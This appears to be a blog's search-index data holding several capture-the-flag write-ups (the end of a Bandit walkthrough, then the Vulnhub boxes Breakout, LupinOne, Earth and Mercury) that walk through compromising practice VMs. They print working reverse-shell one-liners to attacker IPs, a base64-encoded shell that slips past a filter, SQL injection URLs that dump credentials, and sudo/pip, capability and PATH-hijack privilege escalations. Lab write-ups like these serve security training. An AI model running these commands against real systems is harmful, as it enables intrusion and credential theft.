/usr/bin/showtext#!/bin/shexport TERM=linuxmore ~/text.txtexit 0It seems that our unique shell invokes more command upon execution. For this we are required to resize our terminal so that it just becomes a rectangle with a long width but less height to invoke the effects of more command. Once that is done, we just have to press V key and we can use :shell to get a small editor open.Level 26In this level we can using the similar method as in the previous level, we can get the shell. And similar to a past level, we have a suid bit binary. We can just use that to get the password to next level.Level 27For this level we just have to clone a specific repository and find the password to next level from within that repo only.Level 28This level includes another repository but we have to look into the commit history in order to get the password to next level.Level 29Another level and another repository. In this one, the password is contained in a branch other than master.Level 30With this repository we were supposed to inspect the tags on the cloned repository.Level 31This level aimed to introduce us to the concept of committing the code to github repositories. We have to commit the password to current user to the repository. Level 32As the last level of the game, we have another shell escape. The shell seems to convert every command to uppercase. It seemed to be an interactive shell running as a binary itself, hence when used $0(which returns the current shell name), we were provided with our trusty bash shell." }, { "title": "Vulnhub - Empire Breakout Writeup", "url": "/posts/Breakout/", "categories": "Vulnhub", "tags": "vulnhub, getcap, easy, privlege-escalation", "date": "2022-03-04 10:00:00 +0530", "snippet": "IntroBreakout is an easy box freely available on vulnhub website. The author of the box describes it as a CTF styled box and it need a fair amount of enumeration just like the previous Empire box. And as usual, we can expect two flags: User flag Root flagSo let’s start!EnumerationTo begin with, we will start a quick nmap scan to identify all the open ports and possibly all the services which are running on those open ports as well. I like to use the following tags and scan all the open ports on the machine. It might be time consuming but it is better to be thorough than missing something crucial. And moreover the box description asks us to enumerate as much as we can.nmap -sC -sV -p- --open -oN nmap_scan 192.168.146.128Here is a quick description of all the tags used - -sC: Instrcut nmap to use all the default scripts -sV: Help identifying the services running on the open ports -p: Specify which port range to scan. Adding ‘-‘ at the end will scan all the ports –open: Only show open ports -oN: Specify output fileHere we have the following ports open with their respective services 80: Running Apache Webserver 139 &amp;amp; 445 : Running Samba 10000: Running Webmin version 1.981 20000: Running Webmin version 1.830Taking a look at the website served by the webserver, It seemingly looks like an apache default page.On visiting the source for the default page, there was an unusual amount of free space at the end of the page. After continuous scrolling we came across a cipher text of sorts.Let’s analyse this cipher with the help of a tool like decode.fr’s cipher analyser.It’s a brainfuck cipher. This was the first time I came across this one. Let’s get this decypted.It seems to be some kind of a possible password or could just be a credential to something.Next we also have samba running on the server, Let’s enumerate that. I will use enum4linux for the sameenum4linux -a 192.168.146.128I couldn’t find any kind of access window to the server but we did find a local user.Initial AccessWe don’t have a SSH interface enabled to try the credentials we found after decrypting the cipher but we do have webmin interface. Let’s try the credentials there.The Webmin service running on port 20000 accepted our credentials.We can easily get a shell in the webmin environment, you can work with that as well, but I switched to the terminal using a simple revese shell.sh -i &amp;gt;&amp;amp; /dev/tcp/192.168.146.131/9001 0&amp;gt;&amp;amp;1After getting the shell, I stablilised it. I used the following command to stabilise the shell. Once again, it is not necessary to stablise the shell but since we are going to be working with it, it’s just recommended to have some minimum functionality.export TERM=xtermpython3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;(press CTRL+Z)stty raw -echo;fg;resetNow in the home directory we have the user flag and a suspicious looking tar binary owned by root which we can execute. Whenever you come across a misplaced binary like that in a CTF, it is most likely that it will be the key to the box.Privilege EscalationDoing a little bit of enumeration on the machine, we can see that there is a old_pass.bak file located in /var/backups but we don’t have the required permissions to view the file contents.Let’s get back to the tar binary and see if we can do anything with it. To begin with, since there are no special permissions, we will look into the capabilities of the file. It is different than the permissions which a file have. You can get more info about the capabilities and the different capabilities which exists here. We will use the following command to check the capabilities.getcap tarIt has the following capability:CAP_DAC_READ_SEARCH - It means that it can read all the files on the system irrespective of their permissions.We can compress the contents of the old_pass.bak file in a tarball and then extract it. This should provide us the the required permissions to view the contents of the file../tar -cf pass.tar /var/backups/.old_pass.baktar -xf pass.tar cat var/backups/.old_pass.bakWe have got the root password now it seems. Using these credential we can log into the root account and we can get access to the root flag as well now.With this we have successfully completed this machine." }, { "title": "Vulnhub - Empire LupinOne Writeup", "url": "/posts/LupinOne/", "categories": "Vulnhub", "tags": "vulnhub, john, ffuf, medium, privlege-escalation", "date": "2022-02-10 10:00:00 +0530", "snippet": "IntroLupinOne is a medium box freely available on vulnhub website. The author of the box describes it as a CTF styled box and mentions it requires as much enumeration as possible. And as usual, we can expect two flags: User flag Root flagSo let’s start!EnumerationTo begin with, we will start a quick nmap scan to identify all the open ports and possibly all the services which are running on those open ports as well. I like to use the following tags and scan all the open ports on the machine. It might be time consuming but it is better to be thorough than missing something crucial. And moreover the box description asks us to enumerate as much as we can.nmap -sC -sV -p- --open -oN nmap_scan 10.0.2.8Here is a quick description of all the tags used - -sC: Instrcut nmap to use all the default scripts -sV: Help identifying the services running on the open ports -p: Specify which port range to scan. Adding ‘-‘ at the end will scan all the ports –open: Only show open ports -oN: Specify output fileIn the above scan we can see that there are two different ports open - 22: Running regular SSH service 80: Running an apache web serverAnd we can also see that there is a disallowed entry in the robots.txt file: ~myfileFirst let’s check out the website on port 80 and then we will move on to the disallowed directory.The website has nothing out of the ordinary, just an image. It’s time to check out the myfiles directory.And we are greeted with an error 404 message.This is probably the most confusing and time consuming part I dealt with in this box. So ‘~’ symbol was used to denote the home directory of the user. And following similar patterns we can look for other directories as well. We’ll use ffuf for the fuzzing part this time around.ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.0.2.8/~FUZZ -fc 403Here is a quick description of all the tags used - -w: Allows us to supply our custom wordlist -fc: Removes the directory with error code 403And quickly enough, we found a secret directory.Now visiting this page we are greeted with a friendly message.Now, from this page we can deduce three things: There is a ssh key hidden somewhere We can crack the password to that private ssh key using fasttrack wordlist The username is icex64Next, we have more directory enumeration on our plate. Usually hidden files start with a dot in Unix operating systems, so following the trends of the directory enumeration, we can try that in our enumeration process as well. And luckily enough it was how the secret file was hidden.ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.0.2.8/~secret/.FUZZ -e .php,.txt,.html -fc 403We seem to have stumbled upon another hit. Let’s check the file out.It seems to be the secret directory which the previous page was talking about but it seems to be in an encoded form. Since it’s not the basic base64 encoding, we can use dcode.fr to analyse the encoding algorithm.It’s base58 encoded. So let’s head over to our trusty cyberchef and get our decoded key.Initial AccessI saved the file as id_rsa. And before we could use it with SSH, we need to set appropriate permissionschmod 600 id_rsaUsing ssh2john we can convert the private key to a format which can be easily processed by johntheripper.ssh2john id_rsa &amp;gt; john_idNext, the only thing left for us to do is to crack the passphrase using the fasttrack wordlist(earlier hinted on the secret page)john john_id --wordlist=/usr/share/wordlists/fasttrack.txtAnd just like that we got the passphrase. Next up time to get the initial foothold on the system!We will use the user icex which was previously hinted on the secret page and use the password which we obtained using John.ssh icex64@10.0.2.8 -i id_rsaIn the icex64 user’s directory we can see the user flag.Privilege Escalation“sudo -l” is probably one of the first commands I use whenever I get initial access to the system. What it does is, let us know what commands can our current user run as superuser(root) or some other user.sudo -lRunning the above command we can see that our user can execute a python file called heist.py as arsene user and it is located in the user arsene’s home directory.Checking the contents of the file we can see that we are invoking the webbrowser library and performing an action.Our current user can not tamper with the file in any way as we can see in the below screenshot.Let’s check out the webbrowser library then. Usually python libraries will be found in /usr/lib directory.ls -la /usr/lib/python3.9 | grep webbrowserAnd it seems that we found a way to switch to arsene user. We can easily modify the webbrowser.py file and gain a reverse shell from the system.We can just add a very basic python reverse shell. I used the following codeimport pty,socket;s=socket.socket();s.connect((&quot;10.0.2.5&quot;,9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;sh&quot;)Make sure your listener is running on your host system before executing the file!nc -lvnp 9001We can use the following command to run the heist.py file as the arsene usersudo -u arsene python3.9 /home/arsene/heist.pyAnd we got a reverse shell back on our systemI used the following commands to stablise the shellpython3.9 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; # After this press CTRL+Z to background the processstty raw -echo;fg;resetAnd once again we will start by using sudo -l as the arsene userWe can see that our user can run pip command as sudo. Knowing this, we are only a few steps away from reaching the root user. For this step we can use gtfobins. It contains a list of linux binaries which we can use to bypass restrictions and use them in the privilege escalation phase. The following commands(source - gtfobins) will allow us to use pip and reach the root user.TF=$(mktemp -d)echo &quot;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&#39;)&quot; &amp;gt; $TF/setup.pysudo pip install $TFWith this we have completed the LunpinOne box." }, { "title": "Vulnhub - Earth Writeup", "url": "/posts/Earth/", "categories": "Vulnhub", "tags": "vulnhub, easy, privlege-escalation", "date": "2022-01-22 10:00:00 +0530", "snippet": "IntroEarth is an easy box freely available on the vulnhub website. The author of the machine defines it as a little bit on the harder side of the easy category and as always, there are two flags on the machine - User flag Root flagSo let’s begin!EnumerationTo begin with, we will start a quick nmap scan to identify all the open ports and possibly all the services which are running on those open ports as well. In this case I will scan all the open port upto the port 10000.nmap -sC -sV -v -p-10000 --open -oN nmap_scan 10.0.2.7Here is a quick description of all the tags used - -sC: Instrcut nmap to use all the default scripts -sV: Help identifying the services running on the open ports -v: Gives a verbose output -p: Specify which port range to scan. Adding -10000 will scan first 10000 ports –open: Only show open ports -oN: Specify output fileIn the nmap scan, the SSL certificate provides us with two hostnames. ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.localWe have to add these two hostnames to our /etc/hosts file. You can use your favourite text editor to edit it. I will be using nano.sudo nano /etc/hostsNow that we have added the hostnames, we can navigate the websites. Upon visiting earth.local, we are greeted by an earth messaging service. Here we can send the messages to “earth” and we can also see our sent message in an encrypted form.Let’s take a look at the other website nowLet’s check for robots.txt on both websites.And we seem to have stumbled upon something on the test site.After manually trying all the extensions for the testingnotes page, testingnotes.txt seems to be working.It shows us a couple of interesting things. One being that XOR is used to encrypt all the sent messages and there is another file called testdata.txt which include the key value to the encryption. And at last, we have the username to the admin portal which is “terra”.Checking the testdata.txt we can see the possible key for the XOR encryptionLet’s head on to CyberChef and try to decode the sent message to see if they hold anything useful. Also don’t forget to change the value of XOR key from hex to UTF-8.Out of the three sent messages(found on earth.local), the third message seem to repeat a single phrase over and over. Let’s try it on the admin portal.ExploitationTo look for admin portal we can use a tool like gobuster but in this case, I just visited the /admin on earth.local and there we had the admin page.We were able to login on the admin panel by using the following credentialsterra:earthclimatechangebad4humansThe admin portal is simple. We have a basic shell and we can run commands on the server. So let’s try to get a quick reverse shell! I will be using the following basic reverse shellsh -i &amp;gt;&amp;amp; /dev/tcp/10.0.2.5/9001 0&amp;gt;&amp;amp;1Now before we execute this on the server, we should also start a listener on our local machine.nc -lvnp 9001But our command failed. It seems there is a protection method in place which forbids us from making a remote connection.Upon tinkering with it a little bit more, it seems to trigger the above error message whenever an IP address is involved in the commandIt means that we can still pass our reverse shell and it most likely will execute it but we first have to encode it. We can easily base64 encode our shell by using the following command or if you prefer, you can use an online encoder/decoder as well.echo &quot;sh -i &amp;gt;&amp;amp; /dev/tcp/10.0.2.5/9001 0&amp;gt;&amp;amp;1&quot; | base64Now to execute this on the remote server we can run the following command in the commandline tool present on the admin portal.(Make sure your listener is running and base64 encode your own reverse shell!)echo &quot;c2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4yLjUvOTAwMSAwPiYx==&quot; | base64 -d | bashAfter running the above command, we get a bare minimum shell as apache user.Let’s try to stabilise our shell, for that, first let’s look for python and then using the following commands, we can stabilise our reverse shell.Stabilising the shell is not a necessary thing to do but in some cases we might have to use the same shell for quite some time so it might not be the best experience to work with an incomplete shell with missing features like Tab auto-complete and many more. We can use the following sequence of commands to stabilise our shell.which pythonAnd if python or python3 is present -python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;export TERM=xtermAfter that, we have to background the shell using CTRL-Z and then use the following command to bring the shell back.stty raw -echo;fg;resetIt is still not the best of the shells but it is significantly better than what we got before.Privilege EscalationBefore I worked with the privilege escalation part, I decided to look for the user flag. And while looking for non-default directories, we can see in the /var/earth_web directory we have our user flagIn the home folder we have no luck because the directories are totally inaccessible by the apache user. Now the best thing left for us to do is to look for files with SUID bits. You can read about SUID bits and other permissions on the following websiteTo find the binaries with SUID bit, we can use the following commandfind / -perm -u=s -type f 2&amp;gt;/dev/nullThe reset root binary really stands out. Let’s see what does it do.It seems to be calling for some triggers. But as such we dont know anything about them. First of all let’s get the file to our local machine and see what it has.We will be using nc utility to transfer the binary.On our local machine run the following command to start a listenernc -lp 9002 &amp;gt; reset_rootOn the remote server run the following commandnc -w 3 your_ip port &amp;lt; /usr/bin/reset_rootAnd as you can see, we received the file.Now to look for the “triggers” for the execution of the reset_root binary, we are going to use the ltrace utility. ltrace is a simple program which is going to execute the binary until or unless it exits. It will tell us about all the library calls and intercept the system calls made by the binary.First we have to make the reset_root binary executable.chmod +x reset_rootNext we will execute the ltrace utility.ltrace ./reset_rootIt seems to be looking for three file present in different locations. let’s try creating these file and see if we can then execute the reset_root binary.touch /dev/shm/kHgTFI5Gtouch /dev/shm/Zw7bV9U5touch /tmp/kcMOWewereset_rootAnd bingo! we apprently succeeded in resetting the root password to “Earth”Now let’s switch to the root user and grab that root flag!su -(password is Earth)With this we have completed Earth." }, { "title": "Vulnhub - Mercury Writeup", "url": "/posts/Mercury/", "categories": "Vulnhub", "tags": "vulnhub, sqli, sqlmap, easy, privlege-escalation", "date": "2022-01-18 10:00:00 +0530", "snippet": "IntroMercury is an easy box, freely available on vulnhub. The creator of the machine mentions on the page that there are two flags, one being the user flag and the other being the root flag, so nothing out of ordinary so far.EnumerationNmap ScanTo begin with, we will start a quick nmap scan to identify all the open ports and possibly all the services which are running on those open ports as well. I like to use the following tags and scan all the open ports on the machine. It might be time consuming but it is better to be thorough than missing something crucial.nmap -sC -sV -v -p- --open -oN nmap_scan 10.0.2.4Here is a quick description of all the tags used - -sC: Instrcut nmap to use all the default scripts -sV: Help identifying the services running on the open ports -v: Gives a verbose output -p: Specify which port range to scan. Adding ‘-‘ at the end will scan all the ports –open: Only show open ports -oN: Specify output fileIn the above scan we can see that there are two different ports open - 22: Running regular SSH service 8080: Running a WSGi ServerUpon visiting the website on port 8080 we are greeted by a very simple page saying that the site is under development.Manually probing around the website and minor tinkering with the directory shows that the debugger for the web app was enabled and the benevolent error page revealed a new directory which could be of our interest.The new directory which we found is mercuryfacts. Upon visiting it, we can see that there is a fairly incomplete website as mentioned by the previous page.It further links to two different pages, one is a to-do list and the other is a mercury fact.In the to-do list we get to see some interesting entries.The third entry is of interest to us. It shows us a possible SQL Injection vector on the facts page.ExploitationAnd as suspected we get a SQL error and there indeed is a SQLi vulnerability and the error page shown below also greets us with the whole sql statement which the framework is trying to use.Using the union command in SQL, we can run our custom statements on the MySQL server.Here is the whole url usedhttp://10.0.2.4:8080/mercuryfacts/1 union all SELECT user()To check the available databases, we can run the following command and get the output on the facts page.http://10.0.2.4:8080/mercuryfacts/1 union all SELECT schema_ name FROM information schema.schemataWe can see that there is only one distinct database “Mercury” of interest. Let’s check the tables in it.http://10.0.2.4:8080/mercuryfacts/1 union all SELECT table name FROM information _schema.tables;Out of the whole list only users table strike out and moreover it was also referred in the to-do list, lets see what the users table hold for us.http://10.0.2.4:8080/mercuryfacts/1 union all SELECT column name FROM information _schema.columns WHERE table name = ‘users’Now we can see that there are three fields only ID Username PasswordNow it is time to extract the credentials for different users.http://10.0.2.4:8080/mercuryfacts/1 union all SELECT group concat(username,&quot;-&quot;,password) from usersFor the next step, we can try using these credentials on the SSH and see if by any chance, some credential works there.And bingo! the webmaster credentials seem to be working for the SSH and now it is time for some privilege escalation.Privilege EscalationLooking around the Webmaster’s home directory we found out the user_flag! We can tick that one off the list.There is another interesting directory in the home folder called “mercury_proj” which seems to hold the website files. There is a notes.txt file which seems to hold base64 encoded password for a different user called linuxmaster. Let’s decode it and get a hold of that account as well! To decode the password, we can use the following commandecho &quot;base64 encoded string&quot; | base64 -dThe password which we get as a result ismercurymeandiameteris4880kmRunning the “sudo -l” command shows us that linuxmaster user can execute a shell script. But since we can not edit the file so we can not edit the file and get a reverse shell as root. Let’s find another way to root.Taking a quick look at the shell script we can see that it executes “tail” as root user.Our linuxmaster user can create symbolic links, which means that we can link tail command to a different binary such as vi which can give us an easy way to a root shell. Following commands will create a link of “tail” to “vi” and help us get root shell.ln -s /usr/bin/vi tailexport PATH=.:$PATHsudo --preserve-env=PATH /usr/bin/check_syslog.shThe first command will create a symbolic link between tail an vi.Then the second command will update PATH variable with our new PATH. And the third command will execute the shell script with our current PATHNow all we have to break out of Vi is to type “:shell” and we should be good to go.And we have the root! If we head over to the root user’s home directory we will see our second and final flag!With this we have completed Mercury." } ]
